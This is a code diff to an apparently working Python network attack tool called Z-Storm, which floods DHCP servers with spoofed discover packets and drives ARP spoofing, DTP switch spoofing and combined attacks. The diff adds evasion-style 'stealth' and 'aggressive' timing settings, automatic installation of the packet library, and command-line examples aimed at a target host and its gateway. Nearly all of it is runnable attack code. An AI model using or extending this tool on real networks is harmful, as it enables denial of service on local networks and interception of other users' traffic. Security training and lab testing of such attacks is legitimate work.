@@ -8,7 +8,7 @@ Developed by: Youssef Zedan
 Features:
 - DHCP Starvation Attack
 - ARP Spoofing
-- DTP Spoofing (Switch Spoofing)  <-- NEW
+- DTP Spoofing (Switch Spoofing)
 - Auto Lab Automation
 - Smart Scanner
 - Advanced Reporting
@@ -26,18 +26,18 @@ import subprocess
 from datetime import datetime
 from typing import Dict, List, Optional
 
+# ============================================================
+# CHECK DEPENDENCIES (BUT DON'T BLOCK HELP)
+# ============================================================
+
+SCAPY_AVAILABLE = False
+NETIFACES_AVAILABLE = False
+
 try:
     import netifaces
     NETIFACES_AVAILABLE = True
 except ImportError:
-    NETIFACES_AVAILABLE = False
-
-# Import modules
-from modules.smart_scanner import SmartScanner
-from modules.advanced_report import AdvancedReport
-from modules.arp_spoof import ARPSpoofer
-from modules.auto_lab import AutoLab
-from modules.dtp_spoof import DTPSpoofer  # NEW
+    pass
 
 try:
     from scapy.all import (
@@ -47,7 +47,14 @@ try:
     )
     SCAPY_AVAILABLE = True
 except ImportError:
-    SCAPY_AVAILABLE = False
+    pass
+
+# Import modules (will work after dependencies installed)
+from modules.smart_scanner import SmartScanner
+from modules.advanced_report import AdvancedReport
+from modules.arp_spoof import ARPSpoofer
+from modules.auto_lab import AutoLab
+from modules.dtp_spoof import DTPSpoofer
 
 
 class Colors:
@@ -77,7 +84,7 @@ class ZStorm:
         self.scanner = None
         self.arp_spoofer = None
         self.lab = None
-        self.dtp_spoofer = None  # NEW
+        self.dtp_spoofer = None
         
         # Attack state
         self.running = False
@@ -86,6 +93,8 @@ class ZStorm:
         self.attack_type = self.config.get('attack', {}).get('type', 'dhcp_starvation')
         self.thread_count = self.config.get('attack', {}).get('threads', 5)
         self.max_macs = self.config.get('attack', {}).get('max_macs', 10000)
+        self.delay_min = self.config.get('attack', {}).get('delay_min', 0.001)
+        self.delay_max = self.config.get('attack', {}).get('delay_max', 0.01)
         
         # Statistics
         self.stats = {
@@ -287,8 +296,26 @@ class ZStorm:
     def _log_success(self, message: str):
         self.logger.info(f"✅ {message}")
     
+    def _ensure_scapy(self) -> bool:
+        """Ensure Scapy is installed, install if missing"""
+        if SCAPY_AVAILABLE:
+            return True
+        
+        self._log_warning("Scapy is not installed. Attempting automatic installation...")
+        try:
+            subprocess.check_call([sys.executable, "-m", "pip", "install", "scapy"])
+            self._log_success("Scapy installed successfully. Please restart the command.")
+            return False
+        except Exception as e:
+            self._log_error(f"Failed to install Scapy: {e}")
+            self._log_info("Please install manually: pip install scapy")
+            return False
+    
     def scan_network(self) -> Dict:
         """Run smart scanner"""
+        if not self._ensure_scapy():
+            return {}
+        
         print("\n" + "="*50)
         print("🔍 Smart Scanner")
         print("="*50)
@@ -342,6 +369,10 @@ class ZStorm:
     
     def create_dhcp_discover(self, client_mac: str, transaction_id: Optional[int] = None) -> Ether:
         """Create DHCP Discover packet"""
+        if not SCAPY_AVAILABLE:
+            self._log_error("Scapy not available. Please install: pip install scapy")
+            return None
+        
         if transaction_id is None:
             transaction_id = random.randint(0, 0xffffffff)
         
@@ -376,6 +407,9 @@ class ZStorm:
     
     def send_packet_thread(self, thread_id: int):
         """Packet sending thread for DHCP Starvation"""
+        if not SCAPY_AVAILABLE:
+            return
+        
         local_count = 0
         
         while self.running:
@@ -386,6 +420,9 @@ class ZStorm:
             try:
                 client_mac = self.generate_intelligent_mac()
                 packet = self.create_dhcp_discover(client_mac)
+                
+                if packet is None:
+                    continue
                 
                 sendp(packet, iface=self.interface, verbose=False)
                 self.stats['packets_sent'] += 1
@@ -401,11 +438,11 @@ class ZStorm:
                     )
                 
                 if self.attack_mode == "aggressive":
-                    delay = random.uniform(0.0001, 0.001)
+                    delay = random.uniform(self.delay_min, self.delay_min * 10)
                 elif self.attack_mode == "stealth":
-                    delay = random.uniform(0.01, 0.1)
+                    delay = random.uniform(self.delay_max / 2, self.delay_max)
                 else:
-                    delay = random.uniform(0.001, 0.01)
+                    delay = random.uniform(self.delay_min, self.delay_max)
                 
                 time.sleep(delay)
                 
@@ -420,11 +457,13 @@ class ZStorm:
     
     def start_attack(self, network_info: Dict = None, save_report: bool = False, report_name: str = None):
         """Start the selected attack"""
+        if not self._ensure_scapy():
+            return
+        
         print("\n" + "="*50)
         print("⚡ Starting Z-Storm Attack")
         print("="*50)
         
-        # Check attack type
         if self.attack_type == "arp_spoofing" or self.config.get('arp_spoofing', {}).get('enabled', False):
             self._start_arp_spoofing(save_report, report_name)
         elif self.attack_type == "dtp_spoofing" or self.config.get('dtp_spoofing', {}).get('enabled', False):
@@ -432,7 +471,6 @@ class ZStorm:
         elif self.attack_type == "combined":
             self._start_combined_attack(network_info, save_report, report_name)
         else:
-            # Default: DHCP Starvation
             self._start_dhcp_attack(network_info, save_report, report_name)
     
     def _start_dhcp_attack(self, network_info: Dict, save_report: bool, report_name: str):
@@ -524,7 +562,6 @@ class ZStorm:
         """Start combined attack (DHCP + DTP)"""
         self._log_info("Combined attack started")
         
-        # Start DTP Spoofing in background
         if self.dtp_spoofer is None:
             self.dtp_spoofer = DTPSpoofer(
                 interface=self.interface,
@@ -534,10 +571,8 @@ class ZStorm:
         dtp_thread = threading.Thread(target=self.dtp_spoofer.start, daemon=True)
         dtp_thread.start()
         
-        # Start DHCP Starvation
         self._start_dhcp_attack(network_info, save_report, report_name)
         
-        # Stop DTP when DHCP finishes
         if self.dtp_spoofer:
             self.dtp_spoofer.stop()
     
@@ -552,7 +587,6 @@ class ZStorm:
             if thread.is_alive():
                 thread.join(timeout=2)
         
-        # Stop DTP if running
         if self.dtp_spoofer and self.dtp_spoofer.running:
             self.dtp_spoofer.stop()
         
@@ -640,64 +674,79 @@ class ZStorm:
 
 
 def main():
-    """Main entry point"""
+    """Main entry point with both short and long options"""
     parser = argparse.ArgumentParser(
         description="🌩️ Z-Storm - Advanced Network Attack Framework",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
-{Colors.YELLOW}EXAMPLES:{Colors.END}
-  {Colors.CYAN}DHCP Starvation:{Colors.END}
+EXAMPLES:
+  DHCP Starvation:
     sudo zstorm -i eth0
 
-  {Colors.CYAN}ARP Spoofing:{Colors.END}
+  ARP Spoofing (Short):
+    sudo zstorm -i eth0 -Tp arp_spoofing -T 192.168.1.5 -G 192.168.1.1
+
+  ARP Spoofing (Long):
     sudo zstorm -i eth0 --type arp_spoofing --target 192.168.1.5 --gateway 192.168.1.1
 
-  {Colors.CYAN}DTP Spoofing (Switch Spoofing):{Colors.END}
-    sudo zstorm -i eth0 --type dtp_spoofing --dtp-domain "vlan-100"
+  DTP Spoofing (Short):
+    sudo zstorm -i eth0 -Tp dtp_spoofing -D -d "vlan-100"
 
-  {Colors.CYAN}Combined Attack:{Colors.END}
-    sudo zstorm -i eth0 --type combined --dtp --report
-        """.format(Colors=Colors)
+  DTP Spoofing (Long):
+    sudo zstorm -i eth0 --type dtp_spoofing --dtp --dtp-domain "vlan-100"
+
+  Combined Attack:
+    sudo zstorm -i eth0 -Tp combined -D -r
+
+  Network Scan:
+    sudo zstorm -i eth0 -S -r
+        """
     )
     
-    # Basic arguments
-    parser.add_argument("-i", "--interface", help="Network interface")
-    parser.add_argument("-t", "--threads", type=int, default=5, help="Number of threads")
-    parser.add_argument("-c", "--config", default="config.yaml", help="Config file")
-    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
+    # General Options
+    parser.add_argument("-i", "--interface", help="Network interface (auto-detect)")
+    parser.add_argument("-t", "--threads", type=int, default=5, help="Number of threads (default: 5)")
+    parser.add_argument("-c", "--config", default="config.yaml", help="Config file (default: config.yaml)")
+    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
+    parser.add_argument("-V", "--version", action="version", version="Z-Storm v2.0.0", help="Show version")
     
-    # Attack type
-    parser.add_argument("--type", choices=['dhcp_starvation', 'arp_spoofing', 'dtp_spoofing', 'combined'],
-                       default='dhcp_starvation', help="Attack type")
-    parser.add_argument("--mode", choices=['basic', 'aggressive', 'stealth', 'intelligent'],
-                       default='intelligent', help="Attack mode")
+    # Attack Type and Mode
+    parser.add_argument("-Tp", "--type", 
+                       choices=['dhcp_starvation', 'arp_spoofing', 'dtp_spoofing', 'combined'],
+                       default='dhcp_starvation',
+                       help="Attack type: dhcp_starvation, arp_spoofing, dtp_spoofing, combined")
+    parser.add_argument("-M", "--mode",
+                       choices=['basic', 'aggressive', 'stealth', 'intelligent'],
+                       default='intelligent',
+                       help="Attack mode: basic, aggressive, stealth, intelligent")
     
-    # ARP Spoofing options
-    parser.add_argument("--target", help="Target IP for ARP spoofing")
-    parser.add_argument("--gateway", help="Gateway IP (auto-detected)")
-    parser.add_argument("--interval", type=float, default=2.0, help="ARP interval")
+    # DHCP Options
+    parser.add_argument("-Mx", "--max-macs", type=int, default=10000, help="Max MAC addresses (default: 10000)")
+    parser.add_argument("-Dl", "--delay-min", type=float, default=0.001, help="Min delay (default: 0.001)")
+    parser.add_argument("-Dh", "--delay-max", type=float, default=0.01, help="Max delay (default: 0.01)")
     
-    # DTP Spoofing options
-    parser.add_argument("--dtp", action="store_true", help="Enable DTP Spoofing")
-    parser.add_argument("--dtp-domain", help="DTP domain name")
-    parser.add_argument("--dtp-target", help="Target MAC for DTP")
-    parser.add_argument("--dtp-interval", type=float, default=5.0, help="DTP interval")
+    # ARP Options
+    parser.add_argument("-T", "--target", help="Target IP for ARP spoofing")
+    parser.add_argument("-G", "--gateway", help="Gateway IP (auto-detected)")
+    parser.add_argument("-I", "--interval", type=float, default=2.0, help="ARP interval (default: 2.0)")
     
-    # Other options
-    parser.add_argument("--scan", action="store_true", help="Run network scan only")
-    parser.add_argument("--report", action="store_true", help="Generate report")
-    parser.add_argument("--report-name", help="Custom report name")
+    # DTP Options
+    parser.add_argument("-D", "--dtp", action="store_true", help="Enable DTP Spoofing")
+    parser.add_argument("-d", "--dtp-domain", default="z-storm-vlan", help="DTP domain name")
+    parser.add_argument("-m", "--dtp-target", help="Target MAC for DTP")
+    parser.add_argument("-n", "--dtp-interval", type=float, default=5.0, help="DTP interval (default: 5.0)")
+    
+    # Other Options
+    parser.add_argument("-S", "--scan", action="store_true", help="Run network scan only")
+    parser.add_argument("-r", "--report", action="store_true", help="Generate report")
+    parser.add_argument("-R", "--report-name", help="Custom report name")
     
     args = parser.parse_args()
     
     # Check root
     if os.geteuid() != 0:
         print("[!] Root privileges required. Please run with sudo.")
-        sys.exit(1)
-    
-    # Check dependencies
-    if not SCAPY_AVAILABLE:
-        print("[!] Scapy not installed. Run: pip install scapy")
+        print("[!] Example: sudo zstorm -i eth0")
         sys.exit(1)
     
     # Initialize Z-Storm
@@ -706,15 +755,23 @@ def main():
         config_file=args.config
     )
     
-    # Apply arguments
+    # Apply settings
     if args.mode:
         storm.attack_mode = args.mode
     if args.threads:
         storm.thread_count = args.threads
     if args.type:
         storm.attack_type = args.type
+    if args.max_macs:
+        storm.max_macs = args.max_macs
+    if args.delay_min:
+        storm.delay_min = args.delay_min
+        storm.config['attack']['delay_min'] = args.delay_min
+    if args.delay_max:
+        storm.delay_max = args.delay_max
+        storm.config['attack']['delay_max'] = args.delay_max
     
-    # ARP configuration
+    # ARP config
     if args.target:
         storm.config['arp_spoofing']['target_ip'] = args.target
         storm.config['arp_spoofing']['enabled'] = True
@@ -723,7 +780,7 @@ def main():
     if args.interval:
         storm.config['arp_spoofing']['interval'] = args.interval
     
-    # DTP configuration
+    # DTP config
     if args.dtp:
         storm.config['dtp_spoofing']['enabled'] = True
         if args.dtp_domain:
@@ -748,7 +805,7 @@ def main():
         except:
             pass
     
-    # Run scan only
+    # Scan only
     if args.scan:
         network_info = storm.scan_network()
         if args.report:
